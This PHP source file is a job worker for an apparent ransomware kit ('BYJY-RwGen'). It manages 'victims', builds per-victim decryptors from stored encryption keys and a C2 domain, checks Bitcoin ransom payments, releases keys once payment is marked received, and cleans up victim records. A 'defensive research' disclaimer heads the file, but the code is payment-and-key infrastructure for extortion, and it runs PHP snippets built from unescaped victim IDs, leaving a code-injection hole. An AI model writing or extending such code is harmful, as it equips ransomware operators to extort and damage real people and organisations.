<?php
/**
 * Asynchronous Job Worker for Decryption Tasks
 * Handles background processing of decryption jobs
 * For defensive cybersecurity research purposes only
 */

require_once 'enhanced_database.php';
require_once 'payment_monitor.php';

class DecryptionJobWorker {
    private $db;
    private $running = true;
    private $worker_id;
    private $max_concurrent_jobs = 3;
    private $current_jobs = [];
    
    public function __construct($worker_id = null) {
        $this->db = new EnhancedDatabase();
        $this->worker_id = $worker_id ?: 'worker_' . getmypid();
        
        // Set up signal handlers for graceful shutdown
        if (function_exists('pcntl_signal')) {
            pcntl_signal(SIGTERM, [$this, 'gracefulShutdown']);
            pcntl_signal(SIGINT, [$this, 'gracefulShutdown']);
        }
    }
    
    public function gracefulShutdown($signal) {
        $this->log("Received shutdown signal ($signal), finishing current jobs...");
        $this->running = false;
    }
    
    public function start() {
        $this->log("Starting decryption job worker: {$this->worker_id}");
        
        while ($this->running) {
            try {
                // Process pending jobs
                $this->processPendingJobs();
                
                // Clean up completed processes
                $this->cleanupCompletedJobs();
                
                // Check system health
                $this->checkSystemHealth();
                
                // Wait before next cycle
                sleep(5);
                
                // Handle signals
                if (function_exists('pcntl_signal_dispatch')) {
                    pcntl_signal_dispatch();
                }
                
            } catch (Exception $e) {
                $this->log("Worker error: " . $e->getMessage(), 'ERROR');
                sleep(10); // Wait longer on error
            }
        }
        
        $this->log("Worker shutdown completed");
    }
    
    private function processPendingJobs() {
        while (count($this->current_jobs) < $this->max_concurrent_jobs && $this->running) {
            $job = $this->db->getNextDecryptionJob();
            
            if (!$job) {
                break; // No more pending jobs
            }
            
            $this->log("Processing job {$job['id']}: {$job['job_type']} for victim {$job['victim_id']}");
            
            // Start job in background
            $this->startJob($job);
        }
    }
    
    private function startJob($job) {
        try {
            switch ($job['job_type']) {
                case 'compile_decryptor':
                    $this->startDecryptorCompilation($job);
                    break;
                    
                case 'verify_payment':
                    $this->startPaymentVerification($job);
                    break;
                    
                case 'send_decryption_key':
                    $this->startKeyDistribution($job);
                    break;
                    
                case 'cleanup_victim':
                    $this->startVictimCleanup($job);
                    break;
                    
                default:
                    throw new Exception("Unknown job type: {$job['job_type']}");
            }
            
        } catch (Exception $e) {
            $this->log("Failed to start job {$job['id']}: " . $e->getMessage(), 'ERROR');
            $this->db->updateJobStatus($job['id'], 'failed', $e->getMessage());
        }
    }
    
    private function startDecryptorCompilation($job) {
        $payload = json_decode($job['payload'], true);
        $victim_id = $job['victim_id'];
        
        // Get encryption key securely
        $encryption_key = $this->db->getEncryptionKeySecure($victim_id);
        if (!$encryption_key) {
            throw new Exception("Encryption key not found for victim: $victim_id");
        }
        
        // Validate key
        if (!$this->db->validateDecryptionKey($encryption_key)) {
            throw new Exception("Invalid encryption key format");
        }
        
        // Start compilation process
        $cmd = [
            '/app/victim_client/build_decryptor.sh',
            'build',
            $victim_id,
            $encryption_key,
            $payload['c2_domain'] ?? 'localhost'
        ];
        
        $process = proc_open(
            implode(' ', array_map('escapeshellarg', $cmd)),
            [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ],
            $pipes,
            '/app'
        );
        
        if (!$process) {
            throw new Exception("Failed to start decryptor compilation process");
        }
        
        $this->current_jobs[$job['id']] = [
            'process' => $process,
            'pipes' => $pipes,
            'type' => 'compile_decryptor',
            'started' => time(),
            'victim_id' => $victim_id
        ];
        
        // Close stdin
        fclose($pipes[0]);
    }
    
    private function startPaymentVerification($job) {
        $payload = json_decode($job['payload'], true);
        $victim_id = $job['victim_id'];
        
        // Create PHP script to verify payment
        $php_script = "
            require_once '/app/c2_server/enhanced_database.php';
            require_once '/app/c2_server/bitcoin_api.php';
            
            \$db = new EnhancedDatabase();
            \$bitcoin_api = new BitcoinAPI();
            
            \$payment = \$db->getPaymentByVictimId('$victim_id');
            if (!\$payment) {
                echo 'ERROR: Payment not found';
                exit(1);
            }
            
            \$verification = \$bitcoin_api->verifyPayment(
                \$payment['bitcoin_address'],
                \$payment['amount_btc'],
                72
            );
            
            if (\$verification['verified']) {
                \$db->markPaymentReceived('$victim_id', \$verification['transactions'][0]['txid'] ?? 'background_verification');
                echo 'SUCCESS: Payment verified';
            } else {
                echo 'PENDING: Payment not yet confirmed';
            }
        ";
        
        $process = proc_open(
            "php -r " . escapeshellarg($php_script),
            [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'], 
                2 => ['pipe', 'w']
            ],
            $pipes
        );
        
        if (!$process) {
            throw new Exception("Failed to start payment verification process");
        }
        
        $this->current_jobs[$job['id']] = [
            'process' => $process,
            'pipes' => $pipes,
            'type' => 'verify_payment',
            'started' => time(),
            'victim_id' => $victim_id
        ];
        
        fclose($pipes[0]);
    }
    
    private function startKeyDistribution($job) {
        $payload = json_decode($job['payload'], true);
        $victim_id = $job['victim_id'];
        
        // Simulate key distribution (in real scenario, this would send via C&C)
        $this->log("Distributing decryption key to victim: $victim_id");
        
        // Mark job as completed immediately for key distribution
        $this->db->updateJobStatus($job['id'], 'completed');
        $this->db->logSystemEvent('key_distributed', $victim_id, $payload);
        
        $this->log("Key distribution completed for victim: $victim_id");
    }
    
    private function startVictimCleanup($job) {
        $victim_id = $job['victim_id'];
        
        // Cleanup old files and records
        $cleanup_script = "
            require_once '/app/c2_server/enhanced_database.php';
            \$db = new EnhancedDatabase();
            
            // Clean up old decryptor files
            \$decryptor_path = '/tmp/decryptors/decryptor_$victim_id.exe';
            if (file_exists(\$decryptor_path)) {
                unlink(\$decryptor_path);
                echo 'Decryptor file cleaned\\n';
            }
            
            // Update victim status
            \$db->updateVictimStatus('$victim_id', 'cleaned_up');
            echo 'Victim cleanup completed\\n';
        ";
        
        $process = proc_open(
            "php -r " . escapeshellarg($cleanup_script),
            [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ],
            $pipes
        );
        
        if (!$process) {
            throw new Exception("Failed to start cleanup process");
        }
        
        $this->current_jobs[$job['id']] = [
            'process' => $process,
            'pipes' => $pipes,
            'type' => 'cleanup_victim',
            'started' => time(),
            'victim_id' => $victim_id
        ];
        
        fclose($pipes[0]);
    }
    
    private function cleanupCompletedJobs() {
        foreach ($this->current_jobs as $job_id => $job_info) {
            $status = proc_get_status($job_info['process']);
            
            if (!$status['running']) {
                // Process completed
                $stdout = stream_get_contents($job_info['pipes'][1]);
                $stderr = stream_get_contents($job_info['pipes'][2]);
                
                fclose($job_info['pipes'][1]);
                fclose($job_info['pipes'][2]);
                proc_close($job_info['process']);
                
                $runtime = time() - $job_info['started'];
                
                if ($status['exitcode'] === 0) {
                    $this->log("Job $job_id completed successfully in {$runtime}s");
                    $this->db->updateJobStatus($job_id, 'completed');
                    
                    // Log performance data
                    $this->db->recordDecryptionPerformance($job_info['victim_id'], [
                        'processing_time' => $runtime,
                        'job_type' => $job_info['type']
                    ]);
                    
                } else {
                    $this->log("Job $job_id failed with exit code {$status['exitcode']}", 'ERROR');
                    $error_message = "Exit code: {$status['exitcode']}\nSTDERR: $stderr";
                    $this->db->updateJobStatus($job_id, 'failed', $error_message);
                    
                    // Schedule retry if needed
                    $this->db->retryFailedJob($job_id);
                }
                
                // Log system event
                $this->db->logSystemEvent('job_completed', $job_info['victim_id'], [
                    'job_id' => $job_id,
                    'job_type' => $job_info['type'],
                    'exit_code' => $status['exitcode'],
                    'runtime_seconds' => $runtime,
                    'stdout' => substr($stdout, 0, 1000), // Limit log size
                    'stderr' => substr($stderr, 0, 1000)
                ]);
                
                unset($this->current_jobs[$job_id]);
            }
        }
    }
    
    private function checkSystemHealth() {
        static $last_health_check = 0;
        
        // Check health every 60 seconds
        if (time() - $last_health_check < 60) {
            return;
        }
        
        $health = $this->db->getSystemHealth();
        
        // Alert on critical issues
        if ($health['disk_space'] === 'critical') {
            $this->log("CRITICAL: Disk space usage > 90%", 'ERROR');
        }
        
        if ($health['failed_jobs'] > 10) {
            $this->log("WARNING: High number of failed jobs: {$health['failed_jobs']}", 'WARNING');
        }
        
        if ($health['cache'] === 'unavailable') {
            $this->log("WARNING: Redis cache unavailable", 'WARNING');
        }
        
        $this->log("Health check: " . json_encode($health));
        $last_health_check = time();
    }
    
    private function log($message, $level = 'INFO') {
        $timestamp = date('Y-m-d H:i:s');
        echo "[$timestamp] [{$this->worker_id}] [$level] $message\n";
        
        // Also log to system
        error_log("DecryptionWorker[{$this->worker_id}]: $message");
    }
}

// CLI usage
if (php_sapi_name() === 'cli') {
    $worker_id = $argv[1] ?? null;
    
    echo "BYJY-RwGen Decryption Job Worker\n";
    echo "For defensive cybersecurity research purposes only\n";
    echo "Starting background job processor...\n\n";
    
    $worker = new DecryptionJobWorker($worker_id);
    $worker->start();
}
?>